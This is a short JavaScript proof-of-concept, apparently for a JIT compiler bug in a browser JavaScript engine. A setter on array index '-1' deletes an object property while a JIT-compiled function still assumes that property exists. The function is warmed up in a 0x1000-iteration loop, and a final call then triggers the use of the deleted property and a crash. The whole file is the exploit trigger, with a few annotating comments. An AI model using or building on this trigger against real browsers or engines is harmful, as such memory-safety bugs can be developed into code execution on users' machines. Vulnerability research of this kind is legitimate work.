let arr1 = [];
let arr2 = [1.1, 2.2, , 4.4];

//when arr2 property is set, it will delete arr1.x property. This property is then referenced causing a crash
arr2.__defineSetter__("-1", function(x) {
    delete arr1.x;
});

{
	//index JITTED with 5, b is jumping between True and False
    function f(b, index) {
        let ai = {};
        let aT = {};
        arr1.x = ai;
        if (b)
            arr1.x = aT;
        arr2[index] = 1.1;
		
		//vulnerable part, x is deleted when arr2[-1] is set
        arr1.x.x4 = 0;
    }
	
    delete arr1.x;
    for (let i = 0; i < 0x1000; i++) {
		//increase length of arr2, what is this for?
        arr2.length = 4;
		
		//jit with 50% false and true
        f((i & 1) === 1, 5);
    }
    f(true, -1);
}